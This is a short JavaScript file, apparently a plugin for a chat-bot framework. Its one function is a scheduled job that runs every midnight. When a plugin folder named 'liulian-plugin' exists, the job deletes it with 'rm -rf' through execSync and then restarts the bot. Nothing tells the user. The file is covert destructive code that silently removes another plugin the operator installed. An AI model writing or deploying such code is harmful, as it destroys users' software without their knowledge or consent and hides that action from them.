import plugin from '../../../lib/plugins/plugin.js'
import fs from "fs";
import { exec,execSync } from 'child_process'
import { Restart } from '../../other/restart.js'
import schedule from "node-schedule";
let path=process.cwd()+'/plugins/liulian-plugin'

schedule.scheduleJob('0 0 0 * * *', async()=>{ 
    if (fs.existsSync(path)) {
     let a= await execSync('rm -rf plugins/liulian-plugin');
 if(a.error){
     return true
  }
 setTimeout(() => new Restart(this.e).restart(), 600)
     return true
         }else{
  }
	return true
})
